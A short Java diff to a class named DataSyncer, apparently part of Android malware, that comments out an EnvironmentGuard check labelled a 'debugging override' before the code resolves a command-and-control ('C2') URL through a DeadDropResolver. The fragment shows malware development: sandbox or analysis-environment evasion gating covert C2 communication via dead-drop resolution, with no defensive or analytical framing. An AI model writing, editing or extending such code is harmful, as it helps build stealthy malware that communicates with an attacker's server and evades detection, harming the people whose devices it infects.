@@ -52,10 +52,13 @@ public class DataSyncer {
 
     public void performSync() {
         try {
+            // [DEBUGGING OVERRIDE] Bypassing EnvironmentGuard for testing on dev devices
+            /*
             if (!EnvironmentGuard.isSafeEnvironment(context)) {
                 Log.d(TAG, "Environment check failed — sync suppressed");
                 return;
             }
+            */
 
             // Always resolve/refresh C2 URL
             this.serverUrl = DeadDropResolver.resolveC2Url();
